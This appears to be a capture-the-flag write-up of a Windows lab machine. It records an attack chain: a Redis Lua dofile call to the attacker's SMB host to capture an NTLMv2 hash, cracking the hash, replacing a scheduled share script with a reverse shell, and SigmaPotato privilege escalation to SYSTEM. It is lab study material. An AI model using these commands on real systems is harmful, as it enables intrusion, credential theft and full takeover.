## INFORMATION GATHERING
```bash
# IP ADDRESS
10.201.38.114
# HOSTNAME              //Found Post Initial Foothold
VULNNET-BC3TCK1SHNQ
# OPERATING SYSTEM      //Found Post Initial Foothold
OS Version: 10.0.17763 N/A Build 17763
# CREDENTIALS          //Found Post Initial Enumeration
enterprise-security:sand_0873959498 
```
## OPEN PORTS DETAILS
```bash
53/tcp    open  domain        Simple DNS Plus

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

6379/tcp  open  redis         Redis key-value store 2.8.2402

9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
```
# ENUMERATION
## PORT 6379 REDIS 
```bash
# Redis 
sudo redis-cli -h $ip
10.201.38.114:6379> config get *

- Interesting config
"C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
- redis version 2.8.2402

# Reference 
https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html

- Redis can execute Lua scripts using EVAL

# Try to grab hashes
sudo responder -I tun0

REDIS-CLI:6379> eval "dofile('//10.14.30.13/test')" 0 

[SMB] NTLMv2-SSP Client   : 10.201.38.114
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:91c71bd4064276aa:899D703CEE507A5064C5F8A6B7B0CDBD:010100000000000000AC74CF810FDC01EE12DC44656E374E0000000002000800440052004800450001001E00570049004E002D004D004C00350043003100560051004A004B003300420004003400570049004E002D004D004C00350043003100560051004A004B00330042002E0044005200480045002E004C004F00430041004C000300140044005200480045002E004C004F00430041004C000500140044005200480045002E004C004F00430041004C000700080000AC74CF810FDC0106000400020000000800300030000000000000000000000000300000DE289A71FC44A7292A2FC7CA42F591E1DBFFE845EBC3F05CF4A16B725EC9DCDA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310034002E00330030002E00310033000000000000000000

# Cracking the hashes using john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2-hash                                                                           
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)     
1g 0:00:00:00 DONE (2025-08-17 14:19) 1.123g/s 4510Kp/s 4510Kc/s 4510KC/s sanduionut..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

# Credentials
enterprise-security:sand_0873959498
```
## MORE ENUM 
```bash
# Dump usernames using rid-bruteforce
sudo nxc smb $ip -u 'enterprise-security' -p 'sand_0873959498' --rid-brute

# Found usernames
enterprise-security
jack-goldenhand
tony-skid
administrator

# Check shares using credentials 
sudo nxc smb $ip -u 'enterprise-security' -p 'sand_0873959498' --shares                                                                                             
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         10.201.38.114   445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.201.38.114   445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.201.38.114   445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.201.38.114   445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.201.38.114   445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE      
SMB         10.201.38.114   445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.201.38.114   445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 

# Share - Enterprise-Share
sudo nxc smb $ip -u 'enterprise-security' -p 'sand_0873959498' --spider Enterprise-Share --regex .         
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Started spidering
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Spidering .
SMB         10.201.38.114   445    VULNNET-BC3TCK1  //10.201.38.114/Enterprise-Share/. [dir]
SMB         10.201.38.114   445    VULNNET-BC3TCK1  //10.201.38.114/Enterprise-Share/.. [dir]
SMB         10.201.38.114   445    VULNNET-BC3TCK1  //10.201.38.114/Enterprise-Share/PurgeIrrelevantData_1826.ps1 [lastm:'2021-02-24 06:03' size:69]
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Done spidering (Completed in 1.3668031692504883)

- Downloading the file PurgeIrrelevantData_1826.ps1
sudo nxc smb $ip -u 'enterprise-security' -p 'sand_0873959498' --share 'Enterprise-Share' --get-file 'PurgeIrrelevantData_1826.ps1' './PurgeIrrelevantData_1826.ps1'
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Copying "PurgeIrrelevantData_1826.ps1" to "./PurgeIrrelevantData_1826.ps1"
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] File "PurgeIrrelevantData_1826.ps1" was downloaded to "./PurgeIrrelevantData_1826.ps1"

# File contents
cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```
## INITIAL FOOTHOLD
```bash
# Using reverse shell 
https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1

# Rename 
Invoke-PowerShellTcpOneLine.ps1 to PurgeIrrelevantData_1826.ps1 and change the LHOST and LPORT

# Start a Listener 
sudo rlwrap nc -nvlp 53

# Copy and overite the file on the share
sudo nxc smb $ip -u 'enterprise-security' -p 'sand_0873959498' --share 'Enterprise-Share' --put-file './PurgeIrrelevantData_1826.ps1' 'PurgeIrrelevantData_1826.ps1'
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [*] Copying ./PurgeIrrelevantData_1826.ps1 to PurgeIrrelevantData_1826.ps1
SMB         10.201.38.114   445    VULNNET-BC3TCK1  [+] Created file ./PurgeIrrelevantData_1826.ps1 on \\Enterprise-Share\PurgeIrrelevantData_1826.ps1

sudo rlwrap nc -nvlp 53                       
[sudo] password for kali: 
listening on [any] 53 ...
connect to [10.14.30.13] from (UNKNOWN) [10.201.38.114] 50019

PS C:\Users\enterprise-security\Downloads> whoami
vulnnet\enterprise-security
PS C:\Users\enterprise-security\Downloads> 
```
## PRIVILEGE ESCALATION
```bash
PS C:\Users\enterprise-security\Downloads> whoami /all
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

# Sigma Potato
https://github.com/tylerdotrar/SigmaPotato/releases/tag/v1.2.6

- Transfer SigmaPotato.exe
C:\Windows\Tasks>.\SigmaPotato.exe "cmd.exe /c net user pwnd SimplePass123 /add"
C:\Windows\Tasks>.\SigmaPotato.exe "cmd.exe /c net localgroup Administrators pwnd /add"

sudo impacket-psexec pwnd:SimplePass123@$ip
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Requesting shares on 10.201.38.114.....
[*] Found writable share ADMIN$
[*] Uploading file gMVYpLnt.exe
[*] Opening SVCManager on 10.201.38.114.....
[*] Creating service BFXG on 10.201.38.114.....
[*] Starting service BFXG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system                                                                                 
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Thu Aug 14 17:12:58 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.38.114
Nmap scan report for vulnnet.local (10.201.43.83)
Host is up (0.30s latency).
Not shown: 65522 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-14T11:45:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 14 17:16:05 2025 -- 1 IP address (1 host up) scanned in 187.33 seconds
```

